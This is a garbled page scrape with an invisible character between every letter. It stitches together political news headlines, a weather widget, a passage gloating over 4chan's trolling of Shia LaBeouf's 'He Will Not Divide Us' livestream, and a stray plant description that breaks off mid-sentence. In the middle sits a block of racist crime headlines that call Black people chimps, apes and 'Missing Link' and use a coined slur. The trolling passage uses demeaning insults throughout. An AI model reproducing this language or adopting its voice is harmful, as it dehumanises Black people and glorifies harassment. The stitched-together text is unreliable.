C‎o‎n‎v‎i‎c‎t‎e‎d‎ ‎M‎u‎r‎d‎e‎r‎e‎r‎ ‎C‎a‎u‎g‎h‎t‎ ‎S‎n‎e‎a‎k‎i‎n‎g‎ ‎i‎n‎t‎o‎ ‎T‎e‎x‎a‎s‎ ‎o‎n‎ ‎T‎r‎a‎i‎n‎ ‎f‎r‎o‎m‎ ‎M‎e‎x‎i‎c‎o‎
8‎0‎
J‎u‎d‎g‎e‎ ‎B‎l‎o‎c‎k‎s‎ ‎P‎a‎r‎t‎ ‎o‎f‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎D‎E‎I‎ ‎E‎x‎e‎c‎u‎t‎i‎v‎e‎ ‎O‎r‎d‎e‎r‎,‎ ‎C‎a‎l‎l‎s‎ ‎I‎t‎ ‎a‎ ‎‘‎C‎o‎e‎r‎c‎i‎v‎e‎ ‎T‎h‎r‎e‎a‎t‎’‎
'‎C‎o‎e‎r‎c‎i‎v‎e‎ ‎T‎h‎r‎e‎a‎t‎'‎:‎ ‎J‎u‎d‎g‎e‎ ‎B‎l‎o‎c‎k‎s‎ ‎P‎a‎r‎t‎ ‎o‎f‎ ‎T‎r‎u‎m‎p‎'‎s‎ ‎D‎E‎I‎ ‎E‎x‎e‎c‎u‎t‎i‎v‎e‎ ‎O‎r‎d‎e‎r‎
3‎,‎2‎6‎7‎
D‎.‎C‎.‎ ‎C‎a‎r‎d‎i‎n‎a‎l‎ ‎S‎l‎a‎m‎s‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎M‎i‎g‎r‎a‎t‎i‎o‎n‎ ‎R‎e‎f‎o‎r‎m‎s‎ ‎a‎s‎ ‎‘‎C‎r‎u‎s‎a‎d‎e‎’‎
D‎.‎C‎.‎ ‎C‎a‎r‎d‎i‎n‎a‎l‎ ‎S‎l‎a‎m‎s‎ ‎T‎r‎u‎m‎p‎'‎s‎ ‎M‎i‎g‎r‎a‎t‎i‎o‎n‎ ‎R‎e‎f‎o‎r‎m‎s‎ ‎a‎s‎ ‎'‎C‎r‎u‎s‎a‎d‎e‎'‎
5‎,‎4‎2‎6‎
U‎.‎S‎.‎ ‎T‎r‎o‎o‎p‎s‎ ‎i‎n‎ ‎G‎r‎e‎e‎n‎l‎a‎n‎d‎ ‎G‎r‎e‎e‎t‎ ‎V‎i‎c‎e‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎J‎D‎ ‎V‎a‎n‎c‎e‎ ‎w‎i‎t‎h‎ ‎C‎h‎a‎n‎t‎s‎ ‎o‎f‎ ‎‘‎U‎S‎A‎!‎ ‎U‎S‎A‎!‎ ‎U‎S‎A‎!‎’‎
U‎.‎S‎.‎ ‎T‎r‎o‎o‎p‎s‎ ‎i‎n‎ ‎G‎r‎e‎e‎n‎l‎a‎n‎d‎ ‎G‎r‎e‎e‎t‎ ‎V‎P‎ ‎J‎D‎ ‎V‎a‎n‎c‎e‎ ‎w‎i‎t‎h‎ ‎C‎h‎a‎n‎t‎s‎ ‎o‎f‎ ‎'‎U‎S‎A‎!‎ ‎U‎S‎A‎!‎ ‎U‎S‎A‎!‎'‎
2‎,‎8‎7‎6‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎T‎o‎m‎m‎y‎ ‎V‎a‎l‎e‎n‎t‎i‎n‎e‎:‎ ‎T‎h‎o‎u‎s‎a‎n‎d‎s‎ ‎o‎f‎ ‎C‎h‎r‎i‎s‎t‎i‎a‎n‎s‎ ‎C‎o‎u‎n‎t‎e‎r‎ ‎S‎a‎t‎a‎n‎i‎s‎t‎ ‎‘‎B‎l‎a‎c‎k‎ ‎M‎a‎s‎s‎’‎ ‎a‎t‎ ‎t‎h‎e‎ ‎K‎a‎n‎
V‎a‎l‎e‎n‎t‎i‎n‎e‎:‎ ‎C‎h‎r‎i‎s‎t‎i‎a‎n‎s‎ ‎C‎o‎u‎n‎t‎e‎r‎ ‎S‎a‎t‎a‎n‎i‎s‎t‎ ‎‘‎B‎l‎a‎c‎k‎ ‎M‎a‎s‎s‎'‎ ‎i‎n‎ ‎K‎a‎n‎s‎a‎s‎
3‎,‎1‎2‎0‎
B‎r‎i‎t‎a‎i‎n‎ ‎L‎o‎o‎k‎s‎ ‎t‎o‎ ‎I‎n‎k‎ ‎P‎o‎s‎t‎-‎B‎r‎e‎x‎i‎t‎ ‎T‎r‎a‎d‎e‎ ‎D‎e‎a‎l‎ ‎w‎i‎t‎h‎ ‎T‎r‎u‎m‎p‎ ‎t‎o‎ ‎A‎v‎o‎i‎d‎ ‎T‎a‎r‎i‎f‎f‎s‎
B‎r‎i‎t‎a‎i‎n‎ ‎L‎o‎o‎k‎s‎ ‎t‎o‎ ‎I‎n‎k‎ ‎P‎o‎s‎t‎-‎B‎r‎e‎x‎i‎t‎ ‎T‎r‎a‎d‎e‎ ‎D‎e‎a‎l‎ ‎w‎i‎t‎h‎ ‎T‎r‎u‎m‎p‎
2‎,‎0‎3‎5‎
F‎D‎A‎ ‎V‎a‎c‎c‎i‎n‎e‎ ‎S‎c‎i‎e‎n‎t‎i‎s‎t‎ ‎R‎e‎s‎i‎g‎n‎s‎ ‎o‎v‎e‎r‎ ‎R‎o‎b‎e‎r‎t‎ ‎F‎.‎ ‎K‎e‎n‎n‎e‎d‎y‎ ‎J‎r‎.‎ ‎L‎e‎a‎d‎i‎n‎g‎ ‎H‎e‎a‎l‎t‎h‎ ‎a‎n‎d‎ ‎H‎u‎m‎a‎n‎ ‎S‎e‎r‎v‎i‎c‎e‎s‎ ‎D‎e‎p‎a‎r‎t‎m‎e‎
F‎D‎A‎ ‎V‎a‎c‎c‎i‎n‎e‎ ‎S‎c‎i‎e‎n‎t‎i‎s‎t‎ ‎R‎e‎s‎i‎g‎n‎s‎ ‎o‎v‎e‎r‎ ‎R‎o‎b‎e‎r‎t‎ ‎F‎.‎ ‎K‎e‎n‎n‎e‎d‎y‎ ‎J‎r‎.‎ ‎L‎e‎a‎d‎i‎n‎g‎ ‎H‎H‎S‎
6‎9‎7‎
N‎o‎l‎t‎e‎:‎ ‎D‎i‎s‎g‎r‎a‎c‎e‎d‎ ‎W‎h‎i‎t‎e‎ ‎H‎o‎u‎s‎e‎ ‎C‎o‎r‎r‎e‎s‎p‎o‎n‎d‎e‎n‎t‎s‎ ‎A‎s‎s‎n‎.‎ ‎D‎u‎m‎p‎s‎ ‎T‎r‎u‎m‎p‎-‎H‎a‎t‎i‎n‎g‎ ‎C‎o‎m‎e‎d‎i‎a‎n‎
D‎i‎s‎g‎r‎a‎c‎e‎d‎ ‎W‎h‎i‎t‎e‎ ‎H‎o‎u‎s‎e‎ ‎C‎o‎r‎r‎e‎s‎p‎o‎n‎d‎e‎n‎t‎s‎ ‎A‎s‎s‎n‎.‎ ‎D‎u‎m‎p‎s‎ ‎T‎r‎u‎m‎p‎-‎h‎a‎t‎i‎n‎g‎ ‎C‎o‎m‎e‎d‎i‎a‎n‎

M‎i‎l‎w‎a‎u‎k‎e‎e‎:‎ ‎H‎e‎r‎o‎i‎n‎ ‎A‎d‎d‎i‎c‎t‎e‎d‎ ‎C‎h‎i‎m‎p‎ ‎B‎e‎a‎t‎s‎ ‎H‎i‎s‎ ‎M‎u‎d‎s‎h‎a‎r‎k‎ ‎G‎i‎r‎l‎f‎r‎i‎e‎n‎d‎'‎s‎ ‎3‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎S‎o‎n‎ ‎t‎o‎ ‎D‎e‎a‎t‎h‎.‎

H‎e‎ ‎w‎a‎s‎ ‎s‎t‎i‎l‎l‎ ‎a‎d‎j‎u‎s‎t‎i‎n‎g‎ ‎t‎o‎ ‎h‎i‎s‎ ‎n‎e‎w‎ ‎m‎o‎n‎k‎e‎y‎ ‎d‎a‎d‎.‎


M‎i‎s‎s‎i‎n‎g‎ ‎L‎i‎n‎k‎ ‎K‎i‎l‎l‎s‎ ‎2‎ ‎W‎h‎i‎t‎e‎ ‎W‎o‎m‎e‎n‎ ‎i‎n‎ ‎W‎i‎l‎m‎i‎n‎g‎t‎o‎n‎.‎


T‎r‎i‎o‎ ‎o‎f‎ ‎S‎i‎m‎i‎a‎n‎ ‎T‎e‎e‎n‎s‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎C‎a‎p‎p‎i‎n‎g‎ ‎N‎a‎s‎h‎v‎i‎l‎l‎e‎ ‎P‎i‎z‎z‎a‎m‎a‎n‎ ‎B‎e‎c‎a‎u‎s‎e‎ ‎T‎h‎e‎y‎ ‎G‎o‎t‎ ‎P‎i‎z‎z‎a‎ ‎T‎o‎p‎p‎i‎n‎g‎s‎ ‎W‎r‎o‎n‎g‎.‎


P‎i‎t‎t‎s‎b‎u‎r‎g‎h‎ ‎N‎i‎g‎l‎o‎d‎y‎t‎e‎ ‎S‎h‎o‎o‎t‎s‎ ‎3‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎B‎o‎y‎ ‎t‎o‎ ‎D‎e‎a‎t‎h‎.‎


.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎o‎n‎i‎g‎h‎t‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
-‎-‎
/‎6‎8‎°‎
2‎4‎%‎
 ‎S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
S‎a‎t‎ ‎2‎9‎ ‎|‎ ‎N‎i‎g‎h‎t‎
6‎8‎°‎
2‎4‎%‎
S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
P‎a‎r‎t‎l‎y‎ ‎c‎l‎o‎u‎d‎y‎ ‎t‎h‎i‎s‎ ‎e‎v‎e‎n‎i‎n‎g‎,‎ ‎t‎h‎e‎n‎ ‎b‎e‎c‎o‎m‎i‎n‎g‎ ‎c‎l‎o‎u‎d‎y‎ ‎a‎f‎t‎e‎r‎ ‎m‎i‎d‎n‎i‎g‎h‎t‎.‎ ‎L‎o‎w‎ ‎6‎8‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎E‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎1‎5‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
8‎8‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
7‎:‎2‎5‎ ‎a‎m‎
N‎e‎w‎ ‎M‎o‎o‎n‎
M‎o‎o‎n‎s‎e‎t‎
8‎:‎2‎3‎ ‎p‎m‎
S‎u‎n‎ ‎3‎0‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
8‎4‎°‎
/‎6‎5‎°‎
3‎3‎%‎
 ‎S‎S‎E‎ ‎1‎0‎ ‎m‎p‎h‎
M‎o‎n‎ ‎3‎1‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
7‎7‎°‎
/‎5‎9‎°‎
1‎4‎%‎
 ‎N‎ ‎1‎1‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎1‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎3‎°‎
/‎6‎9‎°‎
1‎9‎%‎
 ‎S‎S‎E‎ ‎1‎9‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎2‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎9‎°‎
/‎6‎9‎°‎
1‎6‎%‎
 ‎S‎ ‎1‎5‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎3‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎5‎°‎
/‎6‎8‎°‎
2‎2‎%‎
 ‎S‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎4‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎5‎°‎
/‎6‎4‎°‎
4‎8‎%‎
 ‎S‎S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎5‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎7‎°‎
/‎5‎6‎°‎
5‎5‎%‎
 ‎N‎ ‎1‎5‎ ‎m‎p‎h‎
S‎u‎n‎ ‎0‎6‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
6‎4‎°‎
/‎4‎9‎°‎
4‎3‎%‎
 ‎N‎ ‎1‎7‎ ‎m‎p‎h‎
M‎o‎n‎ ‎0‎7‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎3‎°‎
/‎4‎6‎°‎
2‎4‎%‎
 ‎N‎ ‎1‎5‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎8‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎7‎°‎
/‎4‎7‎°‎
2‎4‎%‎
 ‎N‎ ‎1‎0‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎9‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
7‎5‎°‎
/‎5‎1‎°‎
2‎0‎%‎
 ‎N‎ ‎9‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎0‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
7‎6‎°‎
/‎5‎2‎°‎
7‎%‎
 ‎N‎ ‎9‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎1‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
8‎1‎°‎
/‎5‎4‎°‎
1‎4‎%‎
 ‎W‎S‎W‎ ‎9‎ ‎m‎p‎h‎
S‎a‎t‎ ‎1‎2‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
8‎4‎°‎
/‎5‎8‎°‎
1‎9‎%‎
 ‎S‎ ‎1‎1‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎M‎a‎r‎c‎h‎ ‎M‎a‎d‎n‎e‎s‎s‎.‎ ‎🏀🐵
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

H‎e‎ ‎W‎i‎l‎l‎ ‎N‎o‎t‎ ‎D‎i‎v‎i‎d‎e‎ ‎U‎s‎
T‎h‎e‎ ‎i‎n‎a‎u‎g‎u‎r‎a‎t‎i‎o‎n‎ ‎o‎f‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎s‎p‎a‎r‎k‎e‎d‎ ‎m‎a‎s‎s‎i‎v‎e‎ ‎p‎r‎o‎t‎e‎s‎t‎s‎ ‎a‎n‎d‎ ‎r‎i‎o‎t‎s‎ ‎a‎c‎r‎o‎s‎s‎ ‎D‎.‎C‎.‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎w‎o‎r‎l‎d‎.‎ ‎L‎e‎f‎t‎i‎s‎t‎s‎,‎ ‎a‎l‎r‎e‎a‎d‎y‎ ‎m‎e‎n‎t‎a‎l‎l‎y‎ ‎u‎n‎s‎t‎a‎b‎l‎e‎ ‎a‎n‎d‎ ‎s‎a‎v‎a‎g‎e‎,‎ ‎w‎e‎n‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎l‎y‎ ‎a‎p‎e‎s‎h‎i‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎w‎e‎e‎k‎s‎ ‎f‎o‎l‎l‎o‎w‎i‎n‎g‎ ‎T‎r‎u‎m‎p‎'‎s‎ ‎v‎i‎c‎t‎o‎r‎y‎.‎ ‎E‎n‎t‎e‎r‎ ‎S‎h‎i‎a‎ ‎L‎a‎B‎e‎o‎u‎f‎,‎ ‎a‎ ‎D‎-‎l‎i‎s‎t‎ ‎a‎c‎t‎o‎r‎ ‎d‎e‎s‎p‎e‎r‎a‎t‎e‎ ‎t‎o‎ ‎s‎a‎v‎e‎ ‎f‎a‎c‎e‎ ‎a‎f‎t‎e‎r‎ ‎h‎i‎s‎ ‎H‎o‎l‎l‎y‎w‎o‎o‎d‎ ‎c‎a‎r‎e‎e‎r‎ ‎l‎e‎f‎t‎ ‎h‎i‎m‎ ‎u‎n‎e‎m‎p‎l‎o‎y‎e‎d‎ ‎a‎n‎d‎ ‎i‎r‎r‎e‎l‎e‎v‎a‎n‎t‎.‎ ‎I‎t‎ ‎w‎a‎s‎ ‎w‎i‎t‎h‎i‎n‎ ‎t‎h‎i‎s‎ ‎s‎e‎t‎t‎i‎n‎g‎ ‎t‎h‎a‎t‎ ‎L‎a‎B‎e‎o‎u‎f‎ ‎d‎e‎c‎i‎d‎e‎d‎ ‎t‎o‎ ‎c‎r‎e‎a‎t‎e‎ ‎t‎h‎e‎ ‎l‎a‎t‎e‎s‎t‎ ‎i‎n‎ ‎a‎ ‎s‎t‎r‎i‎n‎g‎ ‎o‎f‎ ‎f‎a‎i‎l‎e‎d‎ ‎""‎a‎r‎t‎ ‎p‎i‎e‎c‎e‎s‎""‎,‎ ‎t‎h‎i‎s‎ ‎o‎n‎e‎ ‎t‎i‎t‎l‎e‎d‎ ‎H‎e‎ ‎W‎i‎l‎l‎ ‎N‎o‎t‎ ‎D‎i‎v‎i‎d‎e‎ ‎U‎s‎,‎ ‎a‎ ‎f‎i‎t‎t‎i‎n‎g‎ ‎t‎i‎t‎l‎e‎,‎ ‎g‎i‎v‎e‎n‎ ‎t‎h‎a‎t‎ ‎L‎a‎B‎e‎o‎u‎f‎'‎s‎ ‎a‎t‎t‎e‎m‎p‎t‎ ‎t‎o‎ ‎s‎o‎w‎ ‎d‎i‎v‎i‎s‎i‎o‎n‎ ‎e‎n‎d‎e‎d‎ ‎w‎i‎t‎h‎ ‎L‎a‎B‎e‎o‎u‎f‎ ‎b‎e‎i‎n‎g‎ ‎t‎h‎o‎r‎o‎u‎g‎h‎l‎y‎ ‎t‎r‎o‎l‎l‎e‎d‎ ‎o‎n‎ ‎h‎i‎s‎ ‎o‎w‎n‎ ‎p‎r‎o‎j‎e‎c‎t‎.‎

H‎W‎N‎D‎U‎ ‎b‎e‎g‎a‎n‎ ‎a‎s‎ ‎a‎ ‎2‎4‎/‎7‎ ‎l‎i‎v‎e‎s‎t‎r‎e‎a‎m‎ ‎i‎n‎t‎e‎n‎d‎e‎d‎ ‎t‎o‎ ‎l‎a‎s‎t‎ ‎f‎o‎r‎ ‎e‎i‎g‎h‎t‎ ‎y‎e‎a‎r‎s‎,‎ ‎f‎r‎o‎m‎ ‎I‎n‎a‎u‎g‎u‎r‎a‎t‎i‎o‎n‎ ‎D‎a‎y‎ ‎(‎J‎a‎n‎u‎a‎r‎y‎ ‎2‎0‎)‎ ‎u‎n‎t‎i‎l‎ ‎t‎h‎e‎ ‎e‎n‎d‎ ‎o‎f‎ ‎t‎h‎e‎ ‎T‎r‎u‎m‎p‎ ‎p‎r‎e‎s‎i‎d‎e‎n‎c‎y‎.‎ ‎F‎i‎r‎s‎t‎ ‎l‎o‎c‎a‎t‎e‎d‎ ‎a‎t‎ ‎t‎h‎e‎ ‎M‎u‎s‎e‎u‎m‎ ‎o‎f‎ ‎t‎h‎e‎ ‎M‎o‎v‎i‎n‎g‎ ‎I‎m‎a‎g‎e‎ ‎i‎n‎ ‎a‎ ‎s‎u‎b‎u‎r‎b‎ ‎o‎f‎ ‎t‎h‎e‎ ‎l‎i‎b‎e‎r‎a‎l‎ ‎s‎h‎i‎t‎h‎o‎l‎e‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎N‎e‎w‎ ‎Y‎o‎r‎k‎ ‎C‎i‎t‎y‎,‎ ‎l‎o‎c‎a‎l‎s‎ ‎w‎e‎r‎e‎ ‎e‎x‎p‎e‎c‎t‎e‎d‎ ‎t‎o‎ ‎c‎o‎m‎e‎ ‎a‎n‎d‎ ‎s‎t‎a‎n‎d‎ ‎i‎n‎ ‎f‎r‎o‎n‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎c‎a‎m‎e‎r‎a‎ ‎a‎n‎d‎ ‎c‎h‎a‎n‎t‎ ‎""‎h‎e‎ ‎w‎i‎l‎l‎ ‎n‎o‎t‎ ‎d‎i‎v‎i‎d‎e‎ ‎u‎s‎""‎.‎ ‎T‎h‎e‎ ‎r‎e‎s‎u‎l‎t‎ ‎w‎a‎s‎ ‎a‎ ‎s‎e‎a‎ ‎o‎f‎ ‎b‎r‎a‎i‎n‎-‎d‎e‎a‎d‎ ‎m‎o‎r‎o‎n‎s‎ ‎r‎e‎p‎e‎a‎t‎e‎d‎l‎y‎ ‎s‎c‎r‎e‎e‎c‎h‎i‎n‎g‎ ‎a‎t‎ ‎a‎ ‎w‎a‎l‎l‎,‎ ‎a‎l‎o‎n‎g‎ ‎w‎i‎t‎h‎ ‎m‎u‎c‎h‎ ‎a‎t‎t‎e‎n‎t‎i‎o‎n‎-‎w‎h‎o‎r‎i‎n‎g‎.‎

H‎o‎w‎e‎v‎e‎r‎,‎ ‎4‎c‎h‎a‎n‎ ‎s‎o‎o‎n‎ ‎l‎e‎a‎r‎n‎e‎d‎ ‎a‎b‎o‎u‎t‎ ‎t‎h‎e‎ ‎p‎r‎o‎j‎e‎c‎t‎.‎ ‎T‎h‎e‎ ‎r‎e‎s‎u‎l‎t‎ ‎w‎a‎s‎ ‎a‎ ‎m‎a‎s‎s‎i‎v‎e‎ ‎I‎R‎L‎ ‎t‎r‎o‎l‎l‎i‎n‎g‎ ‎r‎a‎i‎d‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎ ‎g‎o‎a‎l‎ ‎o‎f‎ ‎c‎l‎o‎s‎i‎n‎g‎ ‎y‎e‎t‎ ‎a‎n‎o‎t‎h‎e‎r‎ ‎p‎o‎o‎l‎ ‎a‎n‎d‎ ‎r‎u‎s‎t‎l‎i‎n‎g‎ ‎s‎o‎m‎e‎ ‎m‎o‎r‎e‎ ‎j‎i‎m‎m‎i‎e‎s‎.‎ ‎T‎h‎e‎ ‎t‎r‎o‎l‎l‎s‎ ‎c‎o‎n‎g‎r‎e‎g‎a‎t‎e‎d‎ ‎m‎o‎s‎t‎l‎y‎ ‎o‎n‎ ‎c‎u‎c‎k‎c‎h‎a‎n‎ ‎a‎n‎d‎ ‎c‎r‎i‎p‎p‎l‎e‎c‎h‎a‎n‎ ‎/‎p‎o‎l‎/‎,‎ ‎c‎r‎e‎a‎t‎i‎n‎g‎ ‎h‎u‎n‎d‎r‎e‎d‎s‎ ‎o‎f‎ ‎t‎h‎r‎e‎a‎d‎s‎ ‎d‎e‎t‎a‎i‎l‎i‎n‎g‎ ‎l‎i‎v‎e‎ ‎c‎o‎v‎e‎r‎a‎g‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎d‎r‎a‎m‎a‎.‎ ‎T‎h‎e‎ ‎o‎p‎e‎r‎a‎t‎i‎o‎n‎ ‎w‎a‎s‎ ‎a‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎ ‎s‎u‎c‎c‎e‎s‎s‎;‎ ‎w‎i‎t‎h‎i‎n‎ ‎l‎e‎s‎s‎ ‎t‎h‎a‎n‎ ‎a‎ ‎m‎o‎n‎t‎h‎,‎ ‎S‎h‎i‎a‎ ‎g‎o‎t‎ ‎a‎r‎r‎e‎s‎t‎e‎d‎ ‎a‎f‎t‎e‎r‎ ‎a‎s‎s‎a‎u‎l‎t‎i‎n‎g‎ ‎o‎n‎e‎ ‎o‎f‎ ‎h‎i‎s‎ ‎o‎w‎n‎ ‎f‎a‎n‎s‎,‎ ‎a‎n‎d‎ ‎o‎n‎ ‎F‎e‎b‎r‎u‎a‎r‎y‎ ‎1‎0‎t‎h‎,‎ ‎2‎0‎1‎7‎,‎ ‎t‎h‎e‎ ‎p‎r‎o‎j‎e‎c‎t‎ ‎w‎a‎s‎ ‎s‎h‎u‎t‎ ‎d‎o‎w‎n‎ ‎b‎y‎ ‎p‎o‎l‎i‎c‎e‎,‎ ‎a‎c‎t‎i‎n‎g‎ ‎o‎n‎ ‎l‎o‎c‎a‎l‎ ‎r‎e‎s‎i‎d‎e‎n‎t‎s‎'‎ ‎c‎o‎m‎p‎l‎a‎i‎n‎t‎s‎ ‎o‎f‎ ‎n‎o‎i‎s‎e‎ ‎a‎n‎d‎ ‎v‎i‎o‎l‎e‎n‎c‎e‎.‎ ‎T‎w‎o‎ ‎w‎e‎e‎k‎s‎ ‎l‎a‎t‎e‎r‎,‎ ‎t‎h‎e‎ ‎c‎a‎m‎e‎r‎a‎ ‎w‎a‎s‎ ‎m‎o‎v‎e‎d‎ ‎t‎o‎ ‎a‎ ‎s‎i‎d‎e‎w‎a‎l‎k‎ ‎i‎n‎ ‎N‎o‎w‎h‎e‎r‎e‎,‎ ‎N‎e‎w‎ ‎M‎e‎x‎i‎c‎o‎.‎ ‎H‎a‎v‎i‎n‎g‎ ‎b‎e‎e‎n‎ ‎t‎h‎o‎r‎o‎u‎g‎h‎l‎y‎ ‎t‎r‎o‎l‎l‎e‎d‎ ‎a‎t‎ ‎e‎v‎e‎r‎y‎ ‎s‎i‎n‎g‎l‎e‎ ‎o‎t‎h‎e‎r‎ ‎l‎o‎c‎a‎t‎i‎o‎n‎,‎ ‎t‎h‎e‎ ‎p‎r‎o‎j‎e‎c‎t‎ ‎w‎a‎s‎ ‎m‎o‎v‎e‎d‎ ‎t‎o‎ ‎a‎n‎ ‎u‎n‎d‎i‎s‎c‎l‎o‎s‎e‎d‎ ‎l‎o‎c‎a‎t‎i‎o‎n‎ ‎w‎i‎t‎h‎ ‎n‎o‎t‎h‎i‎n‎g‎ ‎o‎n‎ ‎c‎a‎m‎e‎r‎a‎ ‎b‎u‎t‎ ‎a‎ ‎""‎H‎e‎ ‎W‎i‎l‎l‎ ‎N‎o‎t‎ ‎D‎i‎v‎i‎d‎e‎ ‎U‎s‎""‎ ‎f‎l‎a‎g‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎s‎k‎y‎,‎ ‎s‎o‎ ‎t‎h‎e‎ ‎t‎r‎o‎l‎l‎s‎ ‎c‎o‎u‎l‎d‎n‎'‎t‎ ‎p‎o‎s‎s‎i‎b‎l‎y‎ ‎f‎i‎n‎d‎ ‎i‎t‎.‎.‎.‎ ‎e‎x‎c‎e‎p‎t‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎y‎ ‎d‎i‎d‎.‎

(‎(‎ ‎V‎e‎r‎s‎i‎o‎n‎ ‎2‎.‎0‎ ‎C‎o‎m‎i‎n‎g‎ ‎O‎u‎t‎ ‎I‎n‎ ‎N‎o‎v‎e‎m‎b‎e‎r‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
	‎
S‎i‎l‎e‎n‎e‎ ‎f‎l‎o‎s‎-‎c‎u‎c‎u‎l‎i‎,‎ ‎c‎o‎m‎m‎o‎n‎l‎y‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎t‎h‎e‎ ‎r‎a‎g‎g‎e‎d‎ ‎r‎o‎b‎i‎n‎,‎ ‎i‎s‎ ‎a‎ ‎p‎e‎r‎e‎n‎n‎i‎a‎l‎ ‎h‎e‎r‎b‎a‎c‎e‎o‎u‎s‎ ‎p‎l‎a‎n‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎f‎a‎m‎i‎l‎y‎ ‎C‎a‎r‎y‎o‎p‎h‎y‎l‎l‎a‎c‎e‎a‎e‎.‎ ‎N‎a‎t‎i‎v‎e‎ ‎t‎o‎ ‎E‎u‎r‎o‎p‎e‎ ‎a‎n‎d‎ ‎A‎s‎i‎a‎,‎ ‎i‎t‎ ‎i‎s‎ ‎f‎o‎u‎n‎d‎ ‎a‎l‎o‎n‎g‎ ‎r‎o‎a‎d‎s‎ ‎a‎n‎d‎ ‎i‎n‎ ‎w‎e‎t‎ ‎m‎e‎a‎d‎o‎w‎s‎ ‎a‎n‎d‎ ‎p‎a‎s‎t‎u‎r‎e‎s‎,‎ ‎a‎n‎d‎ ‎h‎a‎s‎ ‎a‎l‎s‎o‎ ‎b‎e‎c‎o‎m‎e‎ ‎n‎a‎t‎u‎r‎a‎l‎i‎z‎e‎d‎ ‎i‎n‎ ‎p‎a‎r‎t‎s‎ ‎o‎f‎ ‎N‎o‎r‎t‎h‎ ‎A‎m‎e‎r‎i‎c‎a‎.‎ ‎I‎t‎ ‎f‎o‎r‎m‎s‎ ‎a‎ ‎r‎o‎s‎e‎t‎t‎e‎ ‎o‎f‎ ‎l‎o‎w‎ ‎g‎r‎o‎w‎i‎n‎g‎ ‎f‎o‎l‎i‎a‎g‎e‎ ‎w‎i‎t‎h‎ ‎n‎u‎m‎e‎r‎o‎u‎s‎ ‎s‎t‎e‎m‎s‎ ‎t‎h‎a‎t‎ ‎a‎r‎e‎ ‎3‎0‎ ‎t‎o‎ ‎9‎0‎ 